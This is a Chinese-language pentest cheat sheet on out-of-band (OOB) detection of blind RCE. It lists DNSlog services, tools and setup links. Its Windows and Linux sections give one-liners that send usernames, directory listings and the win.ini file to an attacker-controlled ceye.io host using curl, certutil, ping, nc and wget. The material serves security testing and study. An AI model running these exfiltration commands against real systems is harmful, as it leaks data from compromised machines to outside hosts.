# OOB

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**相关文章**
- [带外通道技术（OOB）总结](https://www.freebuf.com/articles/web/201013.html)
- [OOB（out of band）分析系列之DNS渗漏](https://cloud.tencent.com/developer/article/1047283)
- [Burpsuite之BurpCollaborator模块介绍](https://www.jianshu.com/p/92b4b8ddf12f)
- [Persistent Access to Burp Suite Sessions - Step-by-Step Guide](https://www.onsecurity.io/blog/persistent-access-to-burp-suite-sessions-step-by-step-guide/)
- [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
- [HTTP BLIND](https://web.archive.org/web/20200224073305/https://echocipher.github.io/2019/07/22/HTTP-BLIND/)
- [Cracking the lens: targeting HTTP's hidden attack-surface](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)
- [System Hardening을 피해 RCE를 탐지하기 위한 OOB 방법들](https://www.hahwul.com/2022/03/11/bypass-system-hardening-rce-oob/)
- [ping 命令跨平台探测无回显 RCE 技巧](https://mp.weixin.qq.com/s/6NoLiQll9Cz2WjCUdDs6Mw)

**在线监控平台**
- http://ceye.io/
- https://webhook.site
- http://www.dnslog.cn/
- https://iplogger.org/
- https://log.xn--9tr.com/

**相关工具**
- [uknowsec/SharpNetCheck](https://github.com/uknowsec/SharpNetCheck) - 该工具可以在 dnslog 中回显内网 ip 地址和计算机名，可实现内网中的快速定位可出网机器
- [ztgrace/mole](https://github.com/ztgrace/mole) - 识别和利用out-of-band (OOB)漏洞的burp扩展

**平台搭建**
- [十分钟快速自建DNSlog服务器](https://mp.weixin.qq.com/s/m_UXJa0imfOi721bkBpwFg)
- [DNSLOG的快速搭建攻略](https://www.yinxiang.com/everhub/note/471fd1c4-7885-4b67-aa39-41dc36102b43)
- [安全技术|DNSLOG平台搭建从0到1](https://www.4hou.com/posts/VoJ9)
- [自建DNSLog平台](https://www.mi1k7ea.com/2021/03/29/%E8%87%AA%E5%BB%BADNSLog%E5%B9%B3%E5%8F%B0/)
- [快速搭建自用dnslog](https://blog.csdn.net/m0_58434634/article/details/124315127)

**平台**
- [BugScanTeam/DNSLog](https://github.com/BugScanTeam/DNSLog) - DNSLog 是一款监控 DNS 解析记录和 HTTP 访问记录的工具
- [lanyi1998/DNSlog-GO](https://github.com/lanyi1998/DNSlog-GO) - DNSLog-GO 是一款 golang 编写的监控 DNS 解析记录的工具，自带 WEB 界面
- [chennqqi/godnslog](https://github.com/chennqqi/godnslog)
    ```bash
    docker pull "sort/godnslog"
    docker run -p80:8080 -p53:53/udp "sort/godnslog" serve -domain yourdomain.com -4 100.100.100.100
    # yourdomain.com 替换为你的域名 100.100.100.100 替换为你的公网IP
    ```
- [yumusb/DNSLog-Platform-Golang](https://github.com/yumusb/DNSLog-Platform-Golang) - DNSLOG平台 golang 一键启动版
- [phith0n/conote-community](https://github.com/phith0n/conote-community) - Conote 综合安全测试平台社区版
- [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - An OOB interaction gathering server and client library
- [Buzz2d0/Hyuga](https://github.com/Buzz2d0/Hyuga) - 一个用来检测带外(Out-of-Band)流量(DNS查询和HTTP请求)的监控工具
- [AbelChe/cola_dnslog](https://github.com/AbelChe/cola_dnslog)
- [AlphabugX/Alphalog](https://github.com/AlphabugX/Alphalog)
- [Li4n0/revsuit](https://github.com/Li4n0/revsuit) - RevSuit is a flexible and powerful reverse connection platform designed for receiving connection from target host in penetration.

---

## Windows

- ping

    ```
    ping %USERNAME%.xxx.ceye.io

    ping -nc 4 %USERNAME%.xxx.ceye.io
    ```

- certutil

    使用 certutil 请求证书文件，并将下载文件重定向到 nul，无缓存、无需浏览器实现发起 http 请求
    ```bash
    for /F %x in ('dir /b c:\') do certutil -urlcache -split -f "http://xxx.ceye.io/?result=%x" nul
    ```

- curl

    windows 环境默认是支持 curl 的
    ```bash
    for /F %x in ('dir /b c:\') do curl http://xxx.ceye.io/%x

    curl -F file=@C:\windows\win.ini http://xxx.ceye.io
    ```

## linux

- curl

    ```
    curl http://xxx.ceye.io/%x
    ```

- wget

    ```
    wget http://xxx.ceye.io/%x
    ```

- ping

    linux 默认 ping 不带 -c 参数是会导致无限ping下去的,一定要带 -c
    ```bash
    ping -c 4 xxx.ceye.io

    ping -nc 4 xxx.ceye.io
    ```

- openssl

    ```
    openssl s_client -connect xxx.ceye.io:80
    ```

- nc

    ```
    echo -e "GET / HTTP/1.1\nHost: http://xxx.ceye.io/%x\n\n" | nc xxx.ceye.io 80
    ```

- dig

    ```
    dig xxx.ceye.io
    ```
